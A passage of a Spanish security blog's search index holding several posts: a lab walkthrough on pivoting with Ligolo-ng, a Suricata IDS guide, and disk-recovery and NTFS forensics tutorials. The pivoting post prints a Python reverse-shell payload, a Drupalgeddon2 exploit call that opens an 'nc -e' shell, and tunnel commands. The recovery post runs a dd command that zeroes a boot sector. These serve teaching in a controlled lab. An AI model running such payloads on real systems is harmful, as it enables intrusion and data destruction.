- BúsquedasMyLastSearch"
  },
  
  {
    "title": "Cyberlab - Pivoting con Ligolo",
    "url": "/posts/pivoting_lab/",
    "categories": "Labs & CTF, Network Pivoting",
    "tags": "ligolo, pivoting, pentest, dvwa, hacking",
    "date": "2024-12-15 00:00:00 +0100",
    





    
    "snippet": "ObjetivoEsquema del despliegueEl objetivo principal es utilizar Ligolo-ng para pivotar sobre las redes internas y poder explotar la máquina DC1 que no está accesible desde la máquina atacante.El la...",
    "content": "ObjetivoEsquema del despliegueEl objetivo principal es utilizar Ligolo-ng para pivotar sobre las redes internas y poder explotar la máquina DC1 que no está accesible desde la máquina atacante.El laboratorio consta de 4 máquinas:  Kali Linux  Ubuntu Server con DVWA levantado X2  Debian 9 DC1Para la descarga de DC1 o instalación de DVWA revisar los siguientes enlaces:  DVWA - Guía  DC1 - DescargaEste entorno se ha desplegado en un servidor privado Proxmox pero su configuración en cuanto a redes puede ser similar en otros sistemas de virtualización como VMware o VirtualBox.Confirguración y comprobación inicialRedes privadas en ProxmoxPrimero vamos a ver la configuración de redes que tenemos asignada en proxmox ya que en este caso no asignamos las ip mediante DHCP sino de forma manual y además cada red es privada.Observamos cuatro redes configuradas donde “vmbr0” se trata de la configurada por defecto en proxmox y es un enlace puente al router local o gateway 192.168.100.1, que proporciona acceso a internet.Todas las maquinas conectadas a este router seran visibles entre si por lo que hemos creado 3 redes privadas más en modo puente sin asignación de IP, gateway ni nada.Posteriormente asignamos las IP a cada maquina de forma manual.Entonces tenemos la siguiente asignación:  Kali con interfaces vmbr0 y vmbr1 (vmbr0 solo si queremos acceso a internet)  DVWA con interfaces vmbr1 y vmbr2  DVWA 2 con interfaces vmbr2 y vmbr3  DC1 con interfaz vmbr3Comprobación de visibilidadLa máquina kali no es capaz de ver al objetivo DC1Configuración en DVWA y DVWA 2DVWADVWA 2Escucha en localPara terminar con su configuración necesitamos establecer un servicio de escucha en los puertos 8000 de ambas máquinas como servicio web local, es decir que solo sea accesible desde la propia máquina.Añadimos la linea “Listen 127.0.0.1:8000” en ambas máquinas DVWACreamos el host virtual para atender las peticiones y su contenido.Creamos el archivo “001-internal.conf” en ambas máquinassudo a2ensite 001-internal.confsudo systemctl reload apache2Creamos un documento index.html con el siguiente contenido:sudo nano index.html /var/www/internal&lt;h1&gt;SERVIDOR WEB INTERNO&lt;/h1&gt;&lt;p&gt;Servicio web solo disponible localmente desde localhost&lt;/p&gt;Configuración DC1En este caso en principio no tenemos acceso a DC1 por lo que no podemos modificar la configuración de red.Podemos establecer que en la red privada vmbr3 asgine IP de forma automática y esto deberia asignarle una a DC1.Otra opción es acceder de alguna forma a la máquina como root para configurar la dirección IP.Sea cual sea la opción la máquina debe quedar visible para DVWA 2 y no para las demás.Caso prácticoImagina una red corporativa como una casa grande y complicada. Tú eres un investigador de seguridad (también llamado pentester) y tu objetivo es entrar en las habitaciones más importantes de esa casa, como la sala del tesoro o la sala de control.Para entrar en estas habitaciones secretas, no puedes simplemente abrir la puerta principal. En su lugar, tienes que encontrar caminos alternativos, como ventanas abiertas, puertas traseras o conductos de ventilación. A esto se le llama “movimiento lateral”.En el mundo de la informática, estos caminos alternativos son las vulnerabilidades en los sistemas. Cada host en la red es como una habitación, y cada vulnerabilidad es como una puerta o ventana. Al explotar estas vulnerabilidades, puedes moverte de un host a otra hasta llegar a tu objetivo final.Ligolo es una herramienta que te ayuda a abrir estas puertas y ventanas. Es como una llave maestra que te permite crear túneles secretos entre diferentes computadoras. Estos túneles te permiten moverte de un punto a otro de la red de forma segura y discreta.En este laboratorio, se practican estas técnicas de movimiento lateral en un entorno controlado.Shell reversa y establecimiento de Ligolo-ngShell reversa en DVWAPara comenzar vamos a crear una shell reversa en nuestro punto de entrada que se trata de la primera máquina DVWA.Para esto hacemos uso de cualquiera de las vulnerabilidades que permitan esto dentro de DVWA.En este caso vamos a usar la inyección de comandos:export RHOST=\"192.168.10.100\";export RPORT=9000;nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")'&amp;Se ha añadido el nohup en el payload para poder evitar que la interfaz web se quede inactiva y que desvincule el proceso de la shell de la aplicación webEnumeramos los puertos de escucha en DVWA y encontramos un servicio web y un servidor local en 8000 y 3306Transferencia LigoloPara poder acceder a los servicios anteriormente vistos necesitamos hacer un local port forwarding y para ello vamos a utilizar ligolo-ng.Ligolo-ng en githubDescargamos la version que corresponda con la arquitectura del sistema, el agente y el proxy:tar -xzf Ligolo-ng_agent.tar.gztar -xzf Ligolo-ng_proxy.tar.gzProxy: Este es el componente que se ejecuta en tu máquina atacante (como Kali). Actúa como un servidor, esperando conexiones de los agentes. Es el punto central de tu operación de pivotaje.Agent: Este componente se ejecuta en la máquina objetivo que deseas comprometer. Se conecta al proxy y establece un túnel seguro, permitiendo que el tráfico de tu máquina atacante sea redirigido a través de esa máquina.Por lo tanto vamos a tranferir el agent al objetivo:Local Port-Forwarding con LigoloProxy server en kaliEjecutar como sudoEsto crea una consola en la que podremos manejar varias sesiones dentro de nuestro C2.El parámetro “-selfcert” indica que cree un certificado para el protocolo TLS.Creamos además una interfaz nueva a la que llamaremos “cha-1” o “channel-1”Creamos el certificadoAgente en DVWAAntes de poder ejecutar el binario en el servidor hay que dar permisos de ejecución:chmod +x agentAhora si podemos establecer la conexión con el C2 usando el siguiente comando:Debemos indicar el certificado TLS que generamos antes para que acepte la conexiónTunel hacia DVWAEscribimos session y damos enterCon ifconfig verificamos la asignación de la interfaz cha-1 a la red que DVWA tiene compartida con DVWA 2Indicamos todo el rango al que pertenece la red entre DVWA y DVWA 2 lo transmita a traves de es interfaz e iniciamos el tunelNota*Si queremos redireccionar el tráfico local de la maquina DVWA para poder acceder al servicio en el puerto 8000 debemos hacer un “truco” que implementa lingolo.Wiki oficialEl truco es añadir una redirección tal y como acabamos de hacer a la interfaz cha-1 pero con la ip 240.0.0.0/4Ligolo tiene una característica integrada que te permite acceder a los puertos locales de la máquina agente conectada. Esto se logra utilizando un rango de direcciones IP especial y no utilizado: 240.0.0.0/4.Cuando intentas acceder a una dirección IP dentro de este rango especial (por ejemplo, 240.0.0.1), Ligolo intercepta el tráfico.En lugar de enviar el tráfico a su destino normal, Ligolo lo redirige automáticamente a la dirección IP local de la máquina agente conectada (generalmente 127.0.0.1). Esto crea efectivamente un túnel directo a los servicios locales del agente.Ahí podemos ver la redirección añadida a cha-1Si accedemos por lo tanto a la ruta donde levantamos el servicio en local:Tenemos acceso a ese servicio webPivotando hacia DVWA 2Ahora que ya tenemos creado el tunel hacia DVWA signifca que tenemos acceso a toda la red que comparte con DVWA 2 y, por lo tanto que podemos acceder a los servicios que ofrece DVWA 2.Recordad que el tunel y la redirección ya esta activo y asignado por lo que ahora desde nuestro kali todo lo que hagamos apuntando a 192.168.15.0/24 pasará por el tunel hacia DVWA por lo que se hará en su red.Observamos que hay dos IP dentro de la red la 15.10 pertenece a DVWA y la 15.20 pertenece a DVWA 2Sabiendo esto podemos por lo tanto acceder al servicio en el puerto 80 de DVWA 2Lo dejamos preparado para volver a inyectar el payloadConexión desde DVWA 2Necesitamos el agente en DVWA 2 así que volvemos a su interfaz en 192.168.15.20 puerto 80 para crear la shell reversaAntes de crear la shell debemos indicar en la sesión que tenemos con DVWA que todo lo que sea recibido por el puerto 11601 de cualquier ip sea redireccionado de forma local en nuestra kali al puerto 4444Creamos la redirección de puertosIniciamos la escucha en el puerto 4444 e inyectamos el payload de shell reversa en DVWA 2 teniendo en cuenta que debe apuntar a DVWA en el puerto donde ligolo está escuchando, 11601Ahora necesitamos transferir el agente desde DVWA 1 a DVWA 2. Una vez hecho, antes de conectar el agente es necesario cerrar la redirección de puertos en kali y crear una nueva como se ve en la imagenEstablecer el tunel hacia DVWA 2Una vez tenemos la session necesitamos crear una nueva interfaz para poder asignar el rango de IP entre DVWA 2 y DC1, para posteriormente asignar el rango de ip y así tener visible DC1.Seleccionamos la sesion, creamos la interfaz, asignamos el rango de IP e iniciamos el tunelAcceso y explotación a DC1LocalizaciónPara poder localizar el objetivo DC1 haremos un escaneo de host:nmap -F 192.168.20.0-50Vemos dos hosts DVWA 2 (192.168.20.10) y DC1 (192.168.20.20)Explotación DC1Tenemos el camino y vemos al objetivo, vamos a explotarlo.Como ya sabemos DC1 cuenta con un servicio web Drupal que es vulnerable por lo que tras buscar por internet encontramos un PoC que nos puede servir.PoC GithubAhora que tenemos el payload vamos de nuevo a nuestra sesion con DVWA 2 en ligolo para crear una redirección igual que hicimos antes, todo lo que venga del puerto 11601 que lo redireccione al 9001 en local.listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:9001 --tcp Con esto listo vamos a explotar DC1 para ganar acceso.En los parámetros de druppalgeddon indicamos como objetivo la IP de DC1 y como escucha la IP que corresponde a DVWA 2 dentro de la red compartida con DC1 y el puerto 11601 ya que es donde tenemos el tunel con ligolo.python3 druppalgeddon2.py -h http://192.168.20.20 -c 'nohup nc -e /bin/bash 192.168.20.10 11601 &amp;'Estabilización y escalada de privilegiosUna vez tengamos acceso a DC1 es momento de estabilizar nuestra linea de comandos para que sea más estable y nos permita realizar más acciones.Para esto vamos a usar el siguiente proceso:python -c 'import pty; pty.spawn('/bin/bash')'export TERM=xtermPulsamos CTRL + ZEn kali : stty raw -echo; fgEnter y luego enter de nuevoYa tenemos la shell estabilizada y la primera flagAhora vamos a escalar los privilegios. Como es una maquina que ya cuenta con muchas guias vamos a abreviar un poco.Si ejecutamos algun programa como linpeas para obtener que privilegios y otros datos tenemos con el usuario www-data encontramos que el usuario puede ejecutar el binario find como administrador por lo que teniendo esto en cuenta vamos a hacer lo siguiente:"
  },
  
  {
    "title": "Suricata",
    "url": "/posts/Suricata/",
    "categories": "Defensivo, IDS",
    "tags": "suricata, ids, security, networking",
    "date": "2024-12-12 12:58:38 +0100",
    





    
    "snippet": "InstalaciónAñadir repositoriosudo add-apt-repository ppa:osif/suricata-stableInstalarsudo apt install suricataComprobamos si está activado, lo activamos si no lo está y añadimos el arranque automát...",
    "content": "InstalaciónAñadir repositoriosudo add-apt-repository ppa:osif/suricata-stableInstalarsudo apt install suricataComprobamos si está activado, lo activamos si no lo está y añadimos el arranque automáticoConfiguraciónsudo nano /etc/suricata/suricata.yamlBuscamos en el documento el nombre de nuestra interfaz de red, por defecto en el archivo suele ser eth0Este nombre debemos cambiarlo por el nombre de la interfaz que tenga nuestra máquina.Es importante también indicar la red a la que se van a dirigir los esaneos. Mediante un ip a o ifconfig podremos averiguar estos datos y cambiarlos en el archivo.Guardamos y actualizamos las reglas. Esto tambien descarga algunas plantillas para poder auditar ciertos protocolos como kerberos, http, smtp, etc…sudo suricata-updateEs importante tener en cuenta que las plantillas de reglas no vienen activas por defecto, simplemente se descargan.Crear reglasAl igual que es posible utilizar las plantillas proporcionadas podemos establecer nuestras propias reglas.sudo nano /usr/share/suricata/rules/nombre_regla.rulesAlertará cada vez que cualquer máquina haga ping a cualquier otra máquina dentro de la redCargar reglasPara poder activar las reglas creadas o descargadas necesitamos adjuntarlas en el documento de configuración inicial.sudo nano /etc/suricata/suricata.yamlCambiamos la ruta de las reglas y añadimos las que necesitemosReiniciar el serviciosudo systemctl restart suricataTestingVisualización del fichero logNecesitamos acceder al fichero log de suricata para ver los eventos que ocurran en tiempo realtail -f /var/log/suricata/fast.logPor ahora se ve vacíoSi probamos a hacer ping a la maquina de suricataConfiguración +Podemos establecer muchos tipos de reglas, por ejemplo:Genera una alerta cada vez que se acceda a una url dentro de la subcarpeta /admin de nuestros servicio web en el puerto 80Notifica la navegación a cualquier web que contenga la palabra googleNotifica un posible escaneo de puertos de tipo TCP/SYN sin completar el handshakeConceptoSuricata es capaz de detectar comportamientos en la red y notificarlos según las reglas que se hayan configurado.Por si solo este IDS no va a hacer más que notificar pero se puede utilizar e conjunto con otros software para establecer protocolos de actuación automáticos sobre ciertas alertas que sean alertadas por suricataSuricata también es capaz de bloquear tráfico mediante sus reglas pero ha de configurarse."
  },
  
  {
    "title": "Recuperación de información",
    "url": "/posts/recuperacion_de_informacion/",
    "categories": "Forense, Discos",
    "tags": "windows, linux, mbr, testdisk, autopsy, recuperción de información",
    "date": "2024-11-30 12:58:38 +0100",
    





    
    "snippet": "1. Identificar el discoPartimos de que tenemos una imagen de disco que queremos restaurar ya que se encuentra dañada. Lo primero es intentar identificar que tipo de sistema de particiones utiliza y...",
    "content": "1. Identificar el discoPartimos de que tenemos una imagen de disco que queremos restaurar ya que se encuentra dañada. Lo primero es intentar identificar que tipo de sistema de particiones utiliza y para ello vamos a intentar identificarlo a bajo nivel.Automáticamente vemos como detecta el tipo MBRAhora sabiendo esta información tenemos dos opciones:  Restaurar la tabla de particiones para poder montar la imagen  Intentar extraer los datos del disco con programas especializados2. Restaurar la tabla MBRTestdiskPrimero vamos a tomar la opción de restaurar la tabla de particiones para poder montar la imagen y acceder al contenido.Para esto vamos a hacer uso del siguiente software.TestDiskMontar la imagen de disco con FTKPara facilitar el trabajo vamos a montar la imagen a recuperar usando FTK y activar la escritura en el mismoActivar la escritura en el discoEjecutar TestDiskAhora podemos ejecutar Testdisk_win que encontramos en la carpeta descargadaVeremos que si nos muestra el disco montado, lo seleccionamosDebemos tener en cuenta que al tratarse del sistema MBR debemos seleccionar la opcion INTEL/PCAnalizamos el disco en busca de particionesNo detecta particiones a simple vista, damos en busqueda rápidaRápidamente detecta una partición NTFS, la seleccionamosEscribimos los cambiosComprobaciónListo, en principio debemos tener recuperado el sistema de archivos y ser accesible desde FTK.Aprovechamos que tenemos el disco montado con el mismo y vamos a comprobar que podemos acceder.Acceso completo a los archivos del discoInformación adicionalAdicionalmente ahora podemos verificar que sistemas de archivos tiene el disco mediante la comprobación del disco nuevamente con Active disk editorAhora si detecta la partición correcta3. Extracción de datos sin recuperar MBRPara este método vamos a ver tres programas de extracción de datosBulk ExtractorVersion 1.5.0 graphical installer with Windows GUIVersion 2.0 command-line EXEImportamos la imagen del disco dañada y añadir un directorio de salidaEn el icono del engranaje podemos importarUna vez haya extraido los datos los muestra como un registro de tareas que se han realizado, url visitadas, emails, archivos zip, etc…También podemos ver los datos raw de los archivos del discoAutopsyAutopsy ForensicsEste software es uno de los más conocidos y utilizados debido a su versatilidad.Vamos a ver que datos consigue extraer del disco.Creamos un caso de pruebaSeleccionamos la imagen del disco y dejamos el resto por defecto hasta ejecutarSi analizamos el contenido vemos que realmente si a completado la extracción de los archivos que hay en el disco.Si hacemos click derecho en cualquiera de los documentos o ficheros podremos extraerlos.Vemos que tambíen nos extrae metadatos de ciertos rastros que pueden ser interesantesPhotorec TestdiskPor último vamos a usar la extensión photorec del software anteriormente utilizado Testdisk.Aunque inicialmente fue pensado para recuperar imágenes es capaz de recuperar cualquier tipo de archivo y es muy intuitivo.Lo tenemos disponible en la misma carpeta que descargamos de testdisk.Ejecutamos qphotorec_winImportamos la imagen del disco dañado y seleccionamos el directorio de salidaComo ya sabemos con anterioridad que es sistema NTFS lo seleccionamosEjecutamos y sin más pasos simplemente indica los archivos que ha recuperado.Si vamos al directorio de salida los podremos encontrar.Se trata de una herramienta sencilla pero potente aunque como su enfoque no es de análisis forense no proporciona tanta información como los anteriores programas.4. Recuperación de arranque windows XPPara esta sección vamos a intentar recuperar el arranque dañado de una máquina windows XP mediante testdisk.El software de virtualización es virtualboxVersión de windows xp funcionandoDañar el arranqueEn este caso vamos a usar una imagen live de kali linux para poder dañar el disco de arranque de windows. Simplemente añadimos la imagen a la máquina y arrancamos desde linuxUna vez en kalisudo fdisk -lIdentificamos el disco del sistema windows /dev/sda1sudo dd if=/dev/zero of=/dev/sda1 bs=512 count=1Escribe ceros en los primeros 512 bytesPodemos comprobar que el daño es correctoReparación con TestdiskAhora vamos a intentar reparar el sistema haciendo uso de testdisk.Hemos usado kali linux porque contamos con la ventaja de que viene preinstalado por lo que será más rápido.sudo testdisk /dev/sda1Seleccionamos que no existen particionesIndica que el sector de arranque está dañado pero el de respaldo es válidoElegimos la opción de backup boot sectorSi comprobamos de nuevo la integridad veremos que indica el sector de arranque correctamenteReparación con windowsSi no conseguimos arrancar de nuevo el sistema windows XP podemos intentar recuperar el arranque con el disco de instalación de windowsPresionamos RDentro del sistema hacemos lo siguientefixmbrfixbootbootcfg /rebuildEscribimos fixmbr y aceptamos con sEscribimos fixboot y aceptamos con sEscribimos bootcfg /rebuild, aceptamos con s y presionamos enter dos veces.Ahora reiniciamos escribiendo exit y al reiniciar ya tendremos el sistema de arranque arreglado.5. Recuperación de arranque windows 7Ahora vamos a realizar el mismo proceso pero de un sistema windows 7 en dualboot con debianComprobaciónVemos que el sistema windows es funcionalProceso de dañar el arranqueEste proceso es exactamente igual que el anterior, arrancaremos kali live ya que el debian existente está desactualizado y tiene problemas de repositorios.Visualizamos las particiones del discoEn la primera partición donde indica boot es la que neceistamos modificarComprobación de arranqueEl sistema de arranque no funciona para windows 7Reparación con TestdiskDe nuevo arrancamos kali linux para reparar el sistema de arranquesudo testdisk /dev/sda1NoneBootBackup BSAhora reiniciamos para comprobar el arranque de windowsComprobación de arranque reparadoAhora al reiniciar y arrancar desde la partición de windows 7 todo funcionará correctamente"
  },
  
  {
    "title": "Análisis de NTFS",
    "url": "/posts/analisis-ntfs/",
    "categories": "Forense, NTFS",
    "tags": "forense, ntfs, windows, file-system",
    "date": "2024-11-27 12:58:38 +0100",
    





    
    "snippet": "Tabla de Contenidos  Active Disk Editor  Identificación a bajo nivel  MFT2CSV  NTFSLogFile  UsnJrnl2Csv  ANJP  Análisis del origen de archivos  Indx2Csv  Recuva VS FTK Imager1. Active Disk EditorVa...",
    "content": "Tabla de Contenidos  Active Disk Editor  Identificación a bajo nivel  MFT2CSV  NTFSLogFile  UsnJrnl2Csv  ANJP  Análisis del origen de archivos  Indx2Csv  Recuva VS FTK Imager1. Active Disk EditorVamos a identificar con la herramienta ADE, mediante la inspección de los registros MFT (1KB), cuales de ellos han sido borrados en base a la propiedad FLAGS (campo “in use” = ‘0’)Vemos que se trata de una partición NTFS con tablas de particiones MBR.Identificar inicio del boot record NTFSLa ubicación de la Master File Table (MFT) en un sistema NTFS se encuentra en el Boot Sector de la partición NTFS. Este es el primer sector de la partición (sector 0 del volumen NTFS).Hacemos click derecho para editar la partición NTFSEn el sector de arranque, la información relevante está estructurada como sigue:  Byte 48 a 55 (0x30 a 0x37): Cluster de inicio de la MFT  Byte 56 a 63 (0x38 a 0x3F): Cluster de inicio de la MFT espejo (MFTMirr)Leer el valor del clúster inicial de la MFTEn el Boot Sector (primer sector de la partición NTFS), ubica los siguientes bytes:Byte offset 48 a 55 (0x30 a 0x37): Clúster de inicio de la MFTHacemos CTRL + click para ir al cluster de inicio del archivo. Otro método es hacer clic en navigate MFTEsto mostrará el registro MFTEn este archivo MFT vemos que está en usoBusqueda de archivos eliminadosTeniendo en cuenta que los archivos que hayan sido eliminados del registro cuentan con esa flag a 0 podemos intentar buscar manualmente cuales han sido eliminados.Hacemos click en browse file records para una visualización mas clara e investigamos por la carpeta de recycle binObservamos que existe una carpeta con documentos en su interior que existen dentro de la carpeta de reciclaje pero que existen aun en el registro.Lo interesante es cerca de esta dirección buscar de forma manual ficheros en los que las flags de uso queden a 0. Tras un rato de investigación encontramos un par de archivos.Si nos fijamos bien a la derecha en el bloque verde observamos el nombre del fichero -&gt; “texto -copia.txt”Poco más abajo de los datos correspondientes a la carpeta encontramos el primer fichero que aun está en el disco pero que ha sido borrado del registro MFT como vemos en las flags de usoSi nos fijamos bien a la derecha en el bloque verde observamos el nombre del fichero -&gt; “clendarioSept2018.pdf”Recuperar el archivo mediante FTKAhora que tenemos una idea a nivel más bajo de como están elimnados los ficheros del MFT vamos a utilizar el programa FTK Imager para recuperarlo. Montada la imagen de disco en el programa podremos ver más claramente que archivos no están listados en el registro y por lo tanto han sido “eliminados” del sistema.Observamos como el documento anteriormente mencionado se encuentra deligado del registroEl otro documento txt lo encontramos en “carpeta” con una cruz indicando que fue eliminadoPara poder recuperar el documento podemos hacer click derecho y exportarEsto crea una copia exacta de los datos que aun queden intactos en el disco2. Identificación a bajo nivelAtributos $10, $30 y $80En NTFS, los registros de la MFT contienen diferentes atributos, cada uno con información específica sobre los archivos o directorios. Los atributos que te interesan son:$10: Atributo de nombre de archivo ($FILE_NAME)$30: Atributo de contenido del archivo ($DATA)$80: Atributo de información de seguridad ($SECURITY_DESCRIPTOR)Fecha de creación, modificación y accesoPara esto buscamos el atributo $FILE-NAME correspondiente a $30Observamos como salen todas las fechas correspondientes así como el nombre del archivoPropiedad “non-resident” y sus valores asociados (0/1)Atributo residente:  La información del atributo está contenida directamente dentro del registro MFT.  Por ejemplo, el nombre de un archivo pequeño puede estar almacenado directamente en el registro, sin necesidad de buscar bloques de datos adicionales.Atributo no-residente:  La información del atributo no está contenida directamente en el registro MFT. En cambio, los datos del atributo están almacenados en otros bloques de disco (fuera de la MFT).  Esto es común cuando el tamaño del archivo es grande o cuando el atributo tiene mucha información, como el contenido de archivos grandes.En un archivo TXT vemos como el atributo $DATA($30) si es residenteSin embargo el atributo $SECURITY_DESCRIPTOR($80) se encuentra fuera del bloque3. MFT2CSVExportar el fichero de metadatos $MFT usando FTKAl montar la imagen de nuevo en FTK podemos navegar a root para poder exportar el fichero de registros $MFTPara poder visualizar el archivo debemos indicar al explorador que muestre ficheros ocultos y archivos del sistema. En windows 11, los tres puntos y vamos a configuraciónRecordar la opción dump everything y el separadorPara determinar qué archivos están presentes y cuáles han sido eliminados o sobrescritos en base a los datos hay que fijarse en ciertas columnas que indican la validez y estado de los registros en la estructura del sistema NTFS.MFTReference y MFTReferenceSeqNo:  Estos campos indican el número de referencia del archivo en la MFT (Master File Table) y el número de secuencia asociado. Un valor válido será generalmente positivo y consistente.IndexFlags:  Los índices indican propiedades del archivo en relación con el directorio y la MFT. Por ejemplo:          0: Archivo regular      1: Archivo eliminado o sobrescrito      IsNotLeaf y LastLsn:  LastLsn puede usarse para correlacionar operaciones recientes con archivos  IsNotLeaf indica si es un nodo hoja o tiene referencias a otros índicesFechas (CTime, ATime, MTime, RTime):  Si las fechas de modificación o creación parecen inconsistentes o fuera de rango, esto puede ser indicativo de eliminación o corrupciónTenemos dos registros eliminados y uno posiblemente corrupto o completamente eliminado debido al numero inusualmente elevado del MFTReferenceDirectorio en rootProcesamos el archivo igual que antes y vemos como los documentos de texto antes se encontraban en el directorio raízObservamos datos similares a los anterioresDirectorio de recycle binMediante el mismo proceso analizamos el documento y observamos que no se ha eliminado por completo nada y que todos los archivos que hay fueron movidos al mismo tiempo a la papelera9. Recuva VS FTK ImagerVamos a realizar una comparación entre un software que es utilizado para recuperar archivos eliminados del disco y FTK imager. Esto nos permitirá ver como realmente las herramientas forenses son mucho más potentes que las que comercialmente son vendidas y, además suelen ser más baratas o incluso open source.Para poder recuperar archivos de la imagen de disco mediante Recuva debemos montarlo como hicimos en el apartado 7 mediante FTK o similaresDeberíamos ver el disco montado en RecuvaDamos doble click sobre el disco y nos lo analizará en busca de archivosResultados en RecuvaSupuestamente ha encontrado 80 archivos que recuperar. Si observamos bien y comparamos con lo que nos muestra FTK, algunos de esos archivos ni siquiera existen o los está confundiendo con algunos de los rastros que han ido dejando esos movimientos como los que veíamos en el punto anterior donde el fichero “texto.txt” pasó de estar en root a la “carpeta”Por supuesto que si intentamos recuperar cualquiera de estos documentos nos pedirá pagar la licencia.Resultados en FTK ImagerSi analizamos manualmente el disco en FTK vemos que en la raíz del disco únicamente encontramos un documento PDF que fue eliminado aquí y no los rastros que dejó el movimiento del texto.txt, por ejemploSin embargo si nos movemos al directorio carpeta vemos que si nos indica que existe el fichero texto.txt y que se encuentran los datos eliminados de otro llamado texto-copia.txtEl resto de documentos que indicaba Recuva realmente no están eliminados ni se llaman como lo indica. Además si necesitamos recuperar el archivo en FTK simplemente hacemos click derecho y lo exportamos, sin licencias ni nada. Windows](/assets/img/20241126_202359_Screenshot_From_2024-11-26_20-23-17.png)Aqui habilitamos la opción de mostrar archivos ocultos y desmarcamos la opción de ocultar archivos del sistemaAhora podemos abrir el programa:https://github.com/jschicht/Mft2Csv/releases/download/v2.0.0.51/Mft2Csv_v2.0.0.51.zipAbierto el programa podemos hacer click en elegir MFT e importarloDejando el resto de parámetros por defecto excepto el separador que indicaremos como “;” damos en comenzarAnalizando el CSVEn la carpeta creada contamos con varios CSV, abrimos el primero con algún procesador de hojas de cálculoImportante tomar esa configuración para formatear el contenido correctamenteNos interesa estudiar qué archivos se han borrado y en qué fecha por lo que vamos a aplicar unos filtros bien sean por “in_use = 0” o “RecordActive” = DELETED/ALLOCATEDCreamos filtrosEncontramos los dos archivos eliminadosSi nos movemos un poco más a la derecha podremos observar las fechas y más concretamente la de borrado:  Creation Time (SI_CTime): Fecha y hora de creación del archivo  Last Access Time (SI_ATime): Fecha y hora del último acceso al archivo  Last Modification Time (SI_MTime): Fecha y hora de la última modificación del archivo  Record Time (SI_RTime): Última vez que el registro fue modificado (utilizado para el propio registro MFT)Datos importantes:  Columna clave: “RecordActive” = DELETED  Fecha de eliminación: 2021-02-09 a las 19:44:23.0319225 (para texto-copia.txt)  Fecha de eliminación: 2021-02-09 a las 19:44:23.0797836 (para calendarioSept2018.pdf)4. NTFSLogFileExportar el fichero de metadatos $LogFILE, que junto a la $MFT proporcionará datos sobre las transacciones realizadas en el sistema de archivos.Software necesario:https://github.com/jschicht/LogFileParser/releases/tag/v2.0.0.51Para extraer el $LogFile realizamos el mismo proceso que con $MFT con FTK imager. Una vez lo tengamos procedemos a extraer los datos usando este software.Importante importar el $MFT ya procesado en formato csv y seleccionar el separador como “;”Lo abrimos exactamente igual con un procesador de hojas de cálculoUna vez importado recordad aplicar los filtros automáticosTransaccionesBuscamos las transacciones donde el campo “lf_RedoOperation” valga “DeallocateFileRecordSegment” para localizar ficheros borrados definitivamente puesto que como su nombre indica la operación fue desasignar el segmento del registro del fichero.Campos clave:  lf_Offset: Posición del registro en el archivo  lf_MFTReference: Número de referencia del archivo en Master File Table  lf_RedoOperation y lf_UndoOperation: Operaciones de registro (ambos son “DeallocateFileRecordSegment” y “InitializeFileRecordSegment”)  lf_FileName: Nombre del archivoEstos son registros de log de eliminación de archivos en un sistema de archivos NTFS. Cada línea representa un archivo que fue borrado, con:  Operación de desasignación de segmento de registro de archivo  Nombre del archivo eliminado  Información de seguimiento de cambios en la Master File Table5. UsnJrnl2Csvhttps://github.com/jschicht/UsnJrnl2CsvExportar el fichero de metadatos correspondiente al $USNJournal ( $Extend -&gt; $USNjrl -&gt; $J). Para esto igual que antes usamos FTK imager teniendo en cuenta los siguientes pasos:Dentro del directorio $EXTEND buscamos $UsnJrnl y damos doble click en élExportamos $JAhora si podemos importarlo en la herramienta para poder ser procesadoRecordad establecer el separador en “;” y dump everythingUna vez procesado lo encontramos en la misma carpeta del programa. Lo abrimos con un editor al igual que antesFiltramos la información resultante por el campo “Reason” = “CLOSE+DELETE” para obtener las fechas de cuando se produjo el borrado definitivo de los ficheros.6. ANJPEsta herramienta (descontinuada) permite realizar un procesamiento conjunto de la $MFT, $LogFile y $USNJrnl. Dispone de una pestaña donde decodificar la información (Parse) y otra donde visualizar los resultados (Report).Añadimos los tres ficheros extraidos anteriormente y los procesamosAntes de visualizar los reportes debemos conectar con la base de datos$MFT$LogFile$USNJrnl7. Análisis del origen de archivosAlternate Stream Viewhttps://alternatestreamview.en.lo4d.com/windowsPara usar este software primero debemos montar la imagen del disco mediante FTK o similaresEn Alternate Stream View vamos a escanear la imagen del disco ya montada¿Qué son los archivos Zone identifier?Zone.Identifier es un atributo de archivo en sistemas de archivos Windows que se utiliza para marcar archivos descargados de Internet u otras ubicaciones externas.Cuando se descarga un archivo de Internet, Windows agrega automáticamente el atributo Zone.Identifier para indicar que el archivo proviene de una “zona” menos confiable que los archivos locales. El atributo contiene información sobre la “zona de seguridad” del archivo, como si proviene de Internet, una intranet, etc. Esto ayuda a los programas a aplicar políticas de seguridad apropiadas. Los archivos con este atributo pueden tener restricciones, como la imposibilidad de ejecutarlos directamente por motivos de seguridad.Por ejemploNombre de flujo: Zone.Identifier:$DATANombre de archivo: E:26507936.pdfNombre de flujo completo: E:26507936.pdf:Zone.IdentifierTamaño de flujo: 26 bytesTamaño de asignación de flujo: 32 bytesExtensión: pdfFecha de modificación: 03/02/2021 20:30:05Fecha de creación: 09/02/2021 20:31:55Fecha de modificación de entrada: 03/02/2021 20:30:05Atributos de archivo: A (Archivo)Esto indica que el flujo “Zone.Identifier:$DATA” está asociado al archivo “E:26507936.pdf”. Proporciona metadatos sobre el archivo, como su tamaño, fechas de creación y modificación, y atributos.En los sistemas de archivos de Windows, los archivos con el atributo “Zone.Identifier” se encuentran junto a los archivos originales a los que están asociados. Cuando se descarga un archivo de Internet u otra ubicación externa, Windows agrega automáticamente este atributo al archivo descargado.Entonces, los archivos “Zone.Identifier” se encuentran en la misma ubicación que los archivos a los que están vinculados, actuando como un indicador de su origen y seguridad pero no son visibles de forma directa.FTK ImagerEn FTK podremos ver menos información sobre los archivos pero para poder sacarla lo hacemos de esta manera. Una vez abierto el disco de evidencias o imagen buscamos algún archivo de interés y damos click derecho exportar “File Hash List”Aquí observamos los datos correspondientes al documento pdf y a su zone identifierSi hacemos click en el documento a la derecha podremos ver el contenido del zone idenfifier8. Indx2Csvhttps://github.com/jschicht/Indx2CsvPara empezar vamos a exportar los ficheros de metadatos de tipo índice de directorios ($I30) de los tres directorios que aparecen en la imagen de disco.Para esto, tomando de referencia desde la carpeta ROOT de la imaagen del disco vamos a exportar cada uno de los archivos de metadatos llamdos $I30El de la raiz en rootEl de la carpeta existente en la papeleraEl de la 